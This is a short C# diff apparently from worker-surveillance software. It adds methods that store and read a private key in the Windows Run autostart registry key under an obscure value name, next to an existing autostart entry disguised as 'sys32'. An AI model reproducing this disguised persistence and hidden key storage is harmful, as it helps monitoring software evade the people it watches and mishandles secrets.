@@ -31,5 +31,19 @@ namespace SnS.Classes
                 rkRegistry.SetValue("sys32", System.Reflection.Assembly.GetExecutingAssembly().Location.Replace("WorkerSurveillance","KeepAlive"));
             }
         }
+
+        public static void setRegistryPrivateKey(string privateKey)
+        {
+            RegistryKey rkRegistry;
+            rkRegistry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rkRegistry.SetValue("ngeh251yek", privateKey);
+        }
+
+        public static string getRegistryPrivateKey()
+        {
+            RegistryKey rkRegistry;
+            rkRegistry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            return rkRegistry.GetValue("ngeh251yek").ToString(); ;
+        }
     }
 }
